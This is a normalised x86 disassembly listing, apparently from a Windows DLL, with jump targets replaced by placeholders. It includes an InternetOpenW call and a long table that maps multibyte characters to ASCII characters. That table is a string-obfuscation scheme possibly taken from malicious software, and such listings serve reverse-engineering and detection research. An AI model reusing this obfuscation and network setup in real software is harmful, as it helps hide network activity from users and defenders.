call ebx
mov eax [ esp + 0x54 ]
test eax eax
je r-xdata
push eax
call edi
mov eax [ esp + 0x48 ]
cmp eax edi
je r-xdata
push eax
call ebx
mov eax [ esp + 0x50 ]
cmp eax edi
je r-xdata
push eax
call ebx
mov eax [ esp + 0x58 ]
test eax eax
je r-xdata
push eax
call edi
mov eax [ esp + 0x50 ]
cmp eax edi
je r-xdata
push eax
call ebx
mov eax [ esp + 0x54 ]
cmp eax edi
je r-xdata
push eax
call ebx
mov esi [ esp + 0x90 ]
test esi esi
je r-xdata
push eax
call edi
mov eax [ esp + 0x54 ]
cmp eax edi
je r-xdata
push eax
call ebx
mov eax [ esp + 0x58 ]
cmp eax edi
je r-xdata
push eax
call ebx
mov ebx [ esp + 0x24 ]
test ebx ebx
je r-xdata
mov ecx [ esi ]
mov ebx [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov eax [ esp + 0x58 ]
cmp eax edi
je r-xdata
push eax
call ebx
mov esi [ esp + 0x90 ]
cmp esi edi
je r-xdata
push eax
call ebx
xor eax eax
mov edi [ esp + 0x28 ]
mov esi ebx
cmp ebx edi
je r-xdata
push esi
call edi
mov esi ebx
test ebx ebx
jne r-xdata
mov edx [ ecx ]
mov eax [ edx ]
push 0x1
call eax
mov esi [ esp + 0x90 ]
cmp esi edi
je r-xdata
push eax
call ebx
mov ebx [ esp + 0x24 ]
test ebx ebx
je r-xdata
nop
push ebx
call sub_1000a86e
add esp 0x4
nop
mov ebx [ esp + 0x24 ]
test ebx ebx
je r-xdata
mov ecx [ esi ]
mov edi [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov eax 0x4
jmp r-xdata
mov edi [ esp + 0x28 ]
mov esi ebx
cmp ebx edi
je r-xdata
push esi
call ebx
mov esi edi
test edi edi
jne r-xdata
mov eax [ ecx ]
mov edx [ eax ]
push 0x1
call edx
xor edx edx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] dx
add esi 0x24
cmp esi edi
jne r-xdata
mov ecx [ esi ]
push ecx
call sub_1000a86e
add esp 0x4
mov eax 0x5
jmp r-xdata
mov edi [ esp + 0x28 ]
mov esi ebx
cmp ebx edi
je r-xdata
push esi
call ebx
mov esi edi
test edi edi
jne r-xdata
mov edx [ ecx ]
mov eax [ edx ]
push 0x1
call eax
push ebx
call sub_1000a86e
add esp 0x4
lea esp [ esp ]
mov ecx [ esi ]
mov edi [ esi + 0x4 ]
test ecx ecx
je r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
push ebx
call sub_1000a86e
add esp 0x4
nop
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] cx
add esi 0x24
cmp esi edi
jne r-xdata
mov eax [ esi ]
push eax
call sub_1000a86e
add esp 0x4
xor edx edx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] dx
add esi 0x24
cmp esi edi
jne r-xdata
mov ecx [ esi ]
push ecx
call sub_1000a86e
add esp 0x4
cmp [ esi + 0x14 ] 0x8
jb r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
sub_100590b0
push ebp
mov ebp esp
mov ecx [ ebp + 0x10 ]
test ecx ecx
je r-xdata
mov eax [ ebp + 0x8 ]
pop ebp
retn
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
push esi
movzx esi ax
mov eax esi
shl esi 0x10
push edi
or eax esi
shr ecx 0x1
mov edi edx
[ edi ]
adc ecx ecx
[ edi ]
pop edi
mov eax edx
pop esi
pop ebp
retn
sub_100590f0
push ebp
mov ebp esp
mov eax [ ebp + 0x1c ]
mov edx [ ebp + 0x14 ]
push esi
push eax
mov eax [ ebp + 0x10 ]
mov esi ecx
mov ecx [ ebp + 0x18 ]
push ecx
mov ecx [ ebp + 0x8 ]
push edx
push eax
push ecx
mov [ esi ] 0x0
call [ InternetOpenW@IAT ]
xor edx edx
test eax eax
setne dl
mov [ esi ] eax
push edx
call sub_10023cc0
add esp 0x4
mov eax esi
pop esi
pop ebp
retn 0x18
sub_1005912f
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
push [ ebp + 0x8 ]
xor edi edi
mov [ ebp - 0xc ] edi
call sub_1007fa40
mov esi eax
mov eax [ ebp + 0x8 ]
inc esi
pop ecx
mov ebx esi
mov [ ebp - 0x8 ] eax
je r-xdata
inc edi
xor ecx ecx
push 0x2
pop edx
mov eax edi
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call sub_1002b2d3
and [ ebp - 0x10 ] 0x0
mov ebx eax
pop ecx
mov [ ebp - 0x8 ] ebx
test edi edi
je r-xdata
push [ ebp + 0x10 ]
lea eax [ ebp - 0xc ]
push eax
push ebx
push [ ebp - 0x8 ]
lea eax [ ebp - 0x4 ]
push eax
call sub_10025a12
add esp 0x14
test eax eax
jle r-xdata
pop edi
xor eax eax
mov [ ebx ] ax
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
leave
retn
push [ ebp + 0x10 ]
lea eax [ ebp - 0x10 ]
push eax
push esi
push [ ebp + 0x8 ]
push ebx
call sub_10025a12
add esp 0x14
test eax eax
jle r-xdata
add [ ebp - 0x8 ] eax
inc edi
sub ebx eax
jne r-xdata
add [ ebp + 0x8 ] eax
add ebx 0x2
dec edi
jne r-xdata
sub_100591cb
mov edi edi
push esi
mov esi ecx
push [ esi + 0x8 ]
call sub_10019274
push [ esi + 0x10 ]
call sub_10019274
push [ esi + 0x14 ]
call sub_10019274
push [ esi + 0x18 ]
call sub_10019274
add esp 0x10
pop esi
retn
sub_10059210
push ebp
mov ebp esp
push ecx
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0xadb2ec
call sub_1002d420
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x60
mov [ ebp - 0x4 ] 0x84b3ea
call sub_1002d420
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x3c
mov [ ebp - 0x4 ] 0x81a0ec
call sub_1002d420
mov [ eax ] 0x3e
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0xbc9cec
call sub_1002d420
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x21
mov [ ebp - 0x4 ] 0x9ca1eb
call sub_1002d420
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x7e
mov [ ebp - 0x4 ] 0x9890eb
call sub_1002d420
mov [ eax ] 0x23
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x8092ed
call sub_1002d420
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x7c
mov [ ebp - 0x4 ] 0xac97ec
call sub_1002d420
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x5c
mov [ ebp - 0x4 ] 0x90a7eb
call sub_1002d420
mov [ eax ] 0x3b
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0xb09aec
call sub_1002d420
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x2a
mov [ ebp - 0x4 ] 0x848feb
call sub_1002d420
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x5e
mov [ ebp - 0x4 ] 0xac82ec
call sub_1002d420
mov [ eax ] 0x61
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0xbcb3ea
call sub_1002d420
lea ecx [ ebp - 0x4 ]
mov [ eax ] 0x62
mov [ ebp - 0x4 ] 0x98bdec
push ecx
mov ecx rw-data
call sub_1002d420
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x63
mov [ ebp - 0x4 ] 0xb682ec
call sub_1002d420
mov [ eax ] 0x64
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x88a7eb
call sub_1002d420
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x65
mov [ ebp - 0x4 ] 0xb49aec
call sub_1002d420
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x66
mov [ ebp - 0x4 ] 0xb88aed
call sub_1002d420
mov [ eax ] 0x67
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x85b1ec
call sub_1002d420
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x68
mov [ ebp - 0x4 ] 0xa498ec
call sub_1002d420
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x69
mov [ ebp - 0x4 ] 0x8ca0eb
call sub_1002d420
mov [ eax ] 0x6a
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x80a7ec
call sub_1002d420
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x6b
mov [ ebp - 0x4 ] 0xb98beb
call sub_1002d420
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x6c
mov [ ebp - 0x4 ] 0xbcb7ea
call sub_1002d420
mov [ eax ] 0x6d
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x909eec
call sub_1002d420
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x6e
mov [ ebp - 0x4 ] 0x998feb
call sub_1002d420
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x6f
mov [ ebp - 0x4 ] 0xa8b0ec
call sub_1002d420
mov [ eax ] 0x70
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x8c9dec
call sub_1002d420
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x71
mov [ ebp - 0x4 ] 0x9d8bec
call sub_1002d420
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x72
mov [ ebp - 0x4 ] 0xbcaceb
call sub_1002d420
mov [ eax ] 0x73
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0xb094eb
call sub_1002d420
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x74
mov [ ebp - 0x4 ] 0x849cec
call sub_1002d420
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x75
mov [ ebp - 0x4 ] 0xb082ec
call sub_1002d420
mov [ eax ] 0x76
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0xbb9ceb
call sub_1002d420
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x77
mov [ ebp - 0x4 ] 0x9c95ed
call sub_1002d420
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x78
mov [ ebp - 0x4 ] 0x81b6ea
call sub_1002d420
mov [ eax ] 0x79
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x95a0ec
call sub_1002d420
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x7a
mov [ ebp - 0x4 ] 0x989dec
call sub_1002d420
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x31
mov [ ebp - 0x4 ] 0xa09cec
call sub_1002d420
mov [ eax ] 0x32
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0xa5a0eb
call sub_1002d420
lea ecx [ ebp - 0x4 ]
mov [ eax ] 0x33
mov [ ebp - 0x4 ] 0xa493eb
push ecx
mov ecx rw-data
call sub_1002d420
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x34
mov [ ebp - 0x4 ] 0x8495ec
call sub_1002d420
mov [ eax ] 0x35
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0xb49dec
call sub_1002d420
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x36
mov [ ebp - 0x4 ] 0xb496ec
call sub_1002d420
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x37
mov [ ebp - 0x4 ] 0xb8a8eb
call sub_1002d420
mov [ eax ] 0x38
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x888beb
call sub_1002d420
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x39
mov [ ebp - 0x4 ] 0xbc9deb
call sub_1002d420
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x30
mov [ ebp - 0x4 ] 0x948aeb
call sub_1002d420
mov [ eax ] 0x3a
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x83b2ea
call sub_1002d420
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x2f
mov [ ebp - 0x4 ] 0x849dec
call sub_1002d420
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x2e
mov [ ebp - 0x4 ] 0x9c8bec
call sub_1002d420
mov [ eax ] 0x3f
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0xb89dec
call sub_1002d420
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x26
mov [ ebp - 0x4 ] 0x9895ed
call sub_1002d420
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x2d
mov [ ebp - 0x4 ] 0xa48beb
call sub_1002d420
mov [ eax ] 0x5f
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0xb0b8ea
call sub_1002d420
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x3d
mov [ ebp - 0x4 ] 0xb781e3
call sub_1002d420
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x60
mov [ ebp - 0x4 ] 0x8881e3
call sub_1002d420
mov [ eax ] 0x3c
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x8381e3
call sub_1002d420
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x3e
mov [ ebp - 0x4 ] 0x8581e3
call sub_1002d420
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x21
mov [ ebp - 0x4 ] 0x8681e3
call sub_1002d420
mov [ eax ] 0x7e
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x8781e3
call sub_1002d420
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x23
mov [ ebp - 0x4 ] 0x8981e3
call sub_1002d420
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x7c
mov [ ebp - 0x4 ] 0x8e81e3
call sub_1002d420
mov [ eax ] 0x5c
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x9081e3
call sub_1002d420
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x3b
mov [ ebp - 0x4 ] 0xba81e3
call sub_1002d420
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x2a
mov [ ebp - 0x4 ] 0xb981e3
call sub_1002d420
mov [ eax ] 0x5e
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x8a81e3
call sub_1002d420
lea ecx [ ebp - 0x4 ]
mov [ eax ] 0x61
mov [ ebp - 0x4 ] 0x9881e3
push ecx
mov ecx rw-data
call sub_1002d420
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x62
mov [ ebp - 0x4 ] 0x8481e3
call sub_1002d420
mov [ eax ] 0x63
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x9581e3
call sub_1002d420
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x64
mov [ ebp - 0x4 ] 0x9382e3
call sub_1002d420
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x65
mov [ ebp - 0x4 ] 0xaf81e3
call sub_1002d420
mov [ eax ] 0x66
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x8281e3
call sub_1002d420
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x67
mov [ ebp - 0x4 ] 0x8f82e3
call sub_1002d420
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x68
mov [ ebp - 0x4 ] 0x8782e3
call sub_1002d420
mov [ eax ] 0x69
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x8082e3
call sub_1002d420
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x6a
mov [ ebp - 0x4 ] 0x9981e3
call sub_1002d420
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x6b
mov [ ebp - 0x4 ] 0xb381e3
call sub_1002d420
mov [ eax ] 0x6c
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x9282e3
call sub_1002d420
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x6d
mov [ ebp - 0x4 ] 0x8b81e3
call sub_1002d420
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x6e
mov [ ebp - 0x4 ] 0x9181e3
call sub_1002d420
mov [ eax ] 0x6f
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0xbe81e3
call sub_1002d420
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x70
mov [ ebp - 0x4 ] 0x9781e3
call sub_1002d420
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x71
mov [ ebp - 0x4 ] 0x9f81e3
call sub_1002d420
mov [ eax ] 0x72
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x8280e3
call sub_1002d420
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x73
mov [ ebp - 0x4 ] 0x9381e3
call sub_1002d420
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x74
mov [ ebp - 0x4 ] 0x8d82e3
call sub_1002d420
mov [ eax ] 0x75
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x8c81e3
call sub_1002d420
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x76
mov [ ebp - 0x4 ] 0xa381e3
call sub_1002d420
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x77
mov [ ebp - 0x4 ] 0xa681e3
call sub_1002d420
mov [ eax ] 0x78
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x8a82e3
call sub_1002d420
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x79
mov [ ebp - 0x4 ] 0x8c82e3
call sub_1002d420
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x7a
mov [ ebp - 0x4 ] 0xaa81e3
call sub_1002d420
mov [ eax ] 0x31
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0xae81e3
call sub_1002d420
lea ecx [ ebp - 0x4 ]
mov [ eax ] 0x32
mov [ ebp - 0x4 ] 0xab81e3
push ecx
mov ecx rw-data
call sub_1002d420
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x33
mov [ ebp - 0x4 ] 0xa181e3
call sub_1002d420
mov [ eax ] 0x34
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x8c80e3
call sub_1002d420
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x35
mov [ ebp - 0x4 ] 0x8382e3
call sub_1002d420
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x36
mov [ ebp - 0x4 ] 0x9e81e3
call sub_1002d420
mov [ eax ] 0x37
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x8d80e3
call sub_1002d420
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x38
mov [ ebp - 0x4 ] 0xa981e3
call sub_1002d420
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x39
mov [ ebp - 0x4 ] 0x8282e3
call sub_1002d420
mov [ eax ] 0x30
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x8d81e3
call sub_1002d420
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x2f
mov [ ebp - 0x4 ] 0x8b82e3
call sub_1002d420
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x3a
mov [ ebp - 0x4 ] 0xa881e3
call sub_1002d420
mov [ eax ] 0x2e
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x8180e3
call sub_1002d420
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x2d
mov [ ebp - 0x4 ] 0xad81e3
call sub_1002d420
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x3f
mov [ ebp - 0x4 ] 0x9a81e3
call sub_1002d420
mov [ eax ] 0x26
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x8f81e3
call sub_1002d420
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x5f
mov [ ebp - 0x4 ] 0x8181e3
call sub_1002d420
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x3d
mov [ ebp - 0x4 ] 0xacace7
call sub_1002d420
mov [ eax ] 0x3c
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x80b8e4
call sub_1002d420
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x3e
mov [ ebp - 0x4 ] 0x809ce6
call sub_1002d420
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x21
mov [ ebp - 0x4 ] 0x8cbee5
call sub_1002d420
mov [ eax ] 0x7e
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x8bb9e4
call sub_1002d420
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x23
mov [ ebp - 0x4 ] 0x9abae4
call sub_1002d420
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x7c
mov [ ebp - 0x4 ] 0x9f93e5
call sub_1002d420
mov [ eax ] 0x5c
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0xb6afe8
call sub_1002d420
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x3b
mov [ ebp - 0x4 ] 0x84bfe4
call sub_1002d420
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x2a
mov [ ebp - 0x4 ] 0x99b2e6
call sub_1002d420
mov [ eax ] 0x5e
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x9fb9e4
call sub_1002d420
lea ecx [ ebp - 0x4 ]
mov [ eax ] 0x61
mov [ ebp - 0x4 ] 0xb1a8e8
push ecx
mov ecx rw-data
call sub_1002d420
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x62
mov [ ebp - 0x4 ] 0x8fb0e5
call sub_1002d420
mov [ eax ] 0x63
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0xb890e5
call sub_1002d420
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x64
mov [ ebp - 0x4 ] 0x9985e7
call sub_1002d420
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x65
mov [ ebp - 0x4 ] 0x8580e8
call sub_1002d420
mov [ eax ] 0x66
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0xb795e9
call sub_1002d420
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x67
mov [ ebp - 0x4 ] 0x9a80e9
call sub_1002d420
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x68
mov [ ebp - 0x4 ] 0xb1a9e8
call sub_1002d420
mov [ eax ] 0x69
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0xb89be7
call sub_1002d420
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x6a
mov [ ebp - 0x4 ] 0xb695e7
call sub_1002d420
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x6b
mov [ ebp - 0x4 ] 0x8ca1e8
call sub_1002d420
mov [ eax ] 0x6c
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0xba82e7
call sub_1002d420
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x6d
mov [ ebp - 0x4 ] 0xaaa6e8
call sub_1002d420
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x6e
mov [ ebp - 0x4 ] 0xa1bfe4
call sub_1002d420
mov [ eax ] 0x6f
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x87abe8
call sub_1002d420
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x70
mov [ ebp - 0x4 ] 0xb088e6
call sub_1002d420
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x71
mov [ ebp - 0x4 ] 0x9183e6
call sub_1002d420
mov [ eax ] 0x72
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0xad88e7
call sub_1002d420
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x73
mov [ ebp - 0x4 ] 0xa6b5e7
call sub_1002d420
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x74
mov [ ebp - 0x4 ] 0x88bae4
call sub_1002d420
mov [ eax ] 0x75
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x9389e6
call sub_1002d420
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x76
mov [ ebp - 0x4 ] 0xb08de5
call sub_1002d420
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x77
mov [ ebp - 0x4 ] 0x9fa9e6
call sub_1002d420
mov [ eax ] 0x78
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x8bb4e6
call sub_1002d420
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x79
mov [ ebp - 0x4 ] 0x87b6e6
call sub_1002d420
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x7a
mov [ ebp - 0x4 ] 0x9cb5e6
call sub_1002d420
mov [ eax ] 0x31
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x9081e6
call sub_1002d420
lea ecx [ ebp - 0x4 ]
mov [ eax ] 0x32
mov [ ebp - 0x4 ] 0xbc87e6
push ecx
mov ecx rw-data
call sub_1002d420
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x33
mov [ ebp - 0x4 ] 0xb3aee5
call sub_1002d420
mov [ eax ] 0x34
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x9580e6
call sub_1002d420
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x35
mov [ ebp - 0x4 ] 0x849ae7
call sub_1002d420
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x36
mov [ ebp - 0x4 ] 0x8785e5
call sub_1002d420
mov [ eax ] 0x37
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x8b89e6
call sub_1002d420
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x38
